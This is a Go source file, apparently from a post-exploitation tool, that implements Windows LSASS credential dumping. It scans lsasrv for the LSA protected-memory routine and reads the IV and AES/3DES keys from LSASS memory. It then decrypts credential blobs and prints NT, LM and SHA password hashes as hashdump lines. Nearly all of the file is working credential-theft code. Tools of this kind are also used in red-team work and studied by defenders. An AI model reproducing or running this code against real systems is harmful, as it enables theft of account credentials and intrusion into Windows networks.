//go:build windows
// +build windows

package commands

// LSA crypto material capture and credential blob decryption (Phase 2C-ii-b/c).

import (
	"encoding/hex"
	"fmt"
	"strings"
)

var lsaCryptoLayouts = []lsaCryptoLayout{
	LsaCryptoWin10_1607,
	LsaCryptoWin10W8,
}

// lsaCryptoMaterial bundles the raw bytes captured by Phase 2C-ii-b alongside
// their JSON projection.
type lsaCryptoMaterial struct {
	IV     []byte
	AESKey []byte
	DESKey []byte
}

// HasAESKey reports whether the AES key material is fully captured.
func (m lsaCryptoMaterial) HasAESKey() bool {
	return len(m.AESKey) == lsaAESKeyLen && len(m.IV) >= lsaAESIVLen
}

// HasDESKey reports whether the 3DES key material is fully captured.
func (m lsaCryptoMaterial) HasDESKey() bool {
	return len(m.DESKey) == lsaTDESKeyLen && len(m.IV) >= lsaTDESIVLen
}

// captureLsaCrypto runs the Phase 2C-ii-b key extraction:
//  1. Sigscan lsasrvBytes for LsaInitializeProtectedMemory_Internal.
//  2. Resolve the three RIP-relative MOVs to recover IV / h3DesKey / hAesKey.
//  3. ReadProcessMemory the IV bytes and walk the BCrypt key chain.
func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (*insituFullCryptoReport, lsaCryptoMaterial, string) {
	var material lsaCryptoMaterial
	globals, err := findLsaCryptoGlobals(lsasrvBytes, lsasrvBase, layout, r)
	if err != nil {
		return nil, material, err.Error()
	}
	report := &insituFullCryptoReport{
		IVAddress:   fmt.Sprintf("0x%X", globals.IVAddr),
		H3DesGlobal: fmt.Sprintf("0x%X", globals.H3DesKeyAddr),
		HAesGlobal:  fmt.Sprintf("0x%X", globals.HAesKeyAddr),
	}

	if iv, err := readIVBytes(r, globals.IVAddr, layout.IVSize); err != nil {
		report.IVErr = err.Error()
	} else {
		report.IVHex = hex.EncodeToString(iv)
		material.IV = iv
	}

	if hk, k, err := readBcryptKeyMaterial(r, globals.H3DesKeyAddr); err != nil {
		report.H3DesErr = err.Error()
	} else {
		report.H3DesKey = bcryptKeyReport(hk, k)
		material.DESKey = append([]byte(nil), k.Key...)
	}
	if hk, k, err := readBcryptKeyMaterial(r, globals.HAesKeyAddr); err != nil {
		report.HAesErr = err.Error()
	} else {
		report.HAesKey = bcryptKeyReport(hk, k)
		material.AESKey = append([]byte(nil), k.Key...)
	}
	if !material.HasAESKey() && !material.HasDESKey() {
		var parts []string
		if report.IVErr != "" {
			parts = append(parts, "IV: "+report.IVErr)
		}
		if report.H3DesErr != "" {
			parts = append(parts, "3DES: "+report.H3DesErr)
		}
		if report.HAesErr != "" {
			parts = append(parts, "AES: "+report.HAesErr)
		}
		if len(parts) > 0 {
			return report, material, fmt.Sprintf("signature matched but key extraction failed: %s", strings.Join(parts, "; "))
		}
	}
	return report, material, ""
}

// decryptCredentialBlob runs Phase 2C-ii-c against a single captured
// ciphertext blob.
func decryptCredentialBlob(material lsaCryptoMaterial, ciphertext []byte, outerUserName string) (*insituFullDecryptedReport, string) {
	plaintext, alg, err := decryptLsaProtectedMemory(ciphertext, material.AESKey, material.DESKey, material.IV)
	if err != nil {
		report := &insituFullDecryptedReport{Algorithm: string(alg)}
		report.ParseErr = err.Error()
		return report, ""
	}
	layout := detectPrimaryCredentialLayout(plaintext)
	parsed, perr := parsePrimaryCredential10(plaintext, layout)
	report := &insituFullDecryptedReport{
		Algorithm:               string(alg),
		PlaintextLength:         len(plaintext),
		Layout:                  parsed.Layout,
		IsIso:                   parsed.IsIso,
		IsNtOwfPassword:         parsed.IsNtOwfPassword,
		IsLmOwfPassword:         parsed.IsLmOwfPassword,
		IsShaOwPassword:         parsed.IsShaOwPassword,
		HeaderUserNameLength:    parsed.UserNameHeaderLength,
		HeaderUserNameMaxLen:    parsed.UserNameHeaderMaxLen,
		HeaderLogonDomainLength: parsed.LogonDomainHeaderLength,
		HeaderLogonDomainMaxLen: parsed.LogonDomainHeaderMaxLen,
	}
	if perr != nil {
		report.ParseErr = perr.Error()
		return report, ""
	}
	if !allZeroBytes(parsed.NtOwfPassword[:]) {
		report.NtHashHex = hex.EncodeToString(parsed.NtOwfPassword[:])
	}
	if !allZeroBytes(parsed.LmOwfPassword[:]) {
		report.LmHashHex = hex.EncodeToString(parsed.LmOwfPassword[:])
	}
	if !allZeroBytes(parsed.ShaOwPassword[:]) {
		report.ShaHashHex = hex.EncodeToString(parsed.ShaOwPassword[:])
	}
	dumpLine := hashdumpDumpLine(outerUserName, parsed.NtOwfPassword, parsed.LmOwfPassword, parsed.IsLmOwfPassword)
	report.DumpLine = dumpLine
	return report, dumpLine
}

// bcryptKeyReport projects a (handle, key81) pair into JSON-shaped output.
func bcryptKeyReport(hk bcryptHandleKey, k bcryptKey81) *insituFullBcryptKeyReport {
	out := &insituFullBcryptKeyReport{
		HandleAddress:  fmt.Sprintf("0x%X", hk.Address),
		HandleSize:     hk.Size,
		HandleTag:      tagToASCII(hk.Tag),
		HandleTagValid: hk.TagValid,
		KeyAddress:     fmt.Sprintf("0x%X", k.Address),
		KeySize:        k.Size,
		KeyTag:         tagToASCII(k.Tag),
		KeyTagValid:    k.TagValid,
		KeyType:        k.Type,
		KeyBits:        k.Bits,
		CbSecret:       k.CbSecret,
	}
	if hk.HAlgorithm != 0 {
		out.HAlgorithm = fmt.Sprintf("0x%X", hk.HAlgorithm)
	}
	if len(k.Key) > 0 {
		out.KeyHex = hex.EncodeToString(k.Key)
	}
	return out
}

// tagToASCII renders a 4-byte DWORD tag as the four ASCII bytes that would
// appear in memory (little-endian).
func tagToASCII(tag uint32) string {
	bytes := []byte{
		byte(tag),
		byte(tag >> 8),
		byte(tag >> 16),
		byte(tag >> 24),
	}
	for i, b := range bytes {
		if b < 0x20 || b > 0x7E {
			bytes[i] = '.'
		}
	}
	return string(bytes)
}
